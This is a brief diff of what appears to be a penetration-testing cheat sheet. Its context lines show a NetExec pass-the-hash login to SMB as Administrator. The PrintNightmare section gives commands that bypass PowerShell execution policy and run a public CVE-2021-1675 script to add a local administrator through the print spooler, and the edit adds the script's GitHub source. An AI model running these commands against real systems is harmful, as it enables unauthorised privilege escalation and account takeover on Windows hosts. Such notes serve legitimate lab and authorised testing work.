@@ -42,7 +42,7 @@ nxc smb <TargetIP> -u Administrator -H <Hash> --local-auth
 
 ## PrintNightmare
 sc.exe query Spooler
-calebstewart's CVE-2021-1675.ps1, from the target's upload/ folder, adds a local administrator through the spooler:
+calebstewart's CVE-2021-1675.ps1, from https://github.com/calebstewart/CVE-2021-1675 into the target's upload/ folder, adds a local administrator through the spooler:
 powershell -ep bypass
 Import-Module .\CVE-2021-1675.ps1
 Invoke-Nightmare
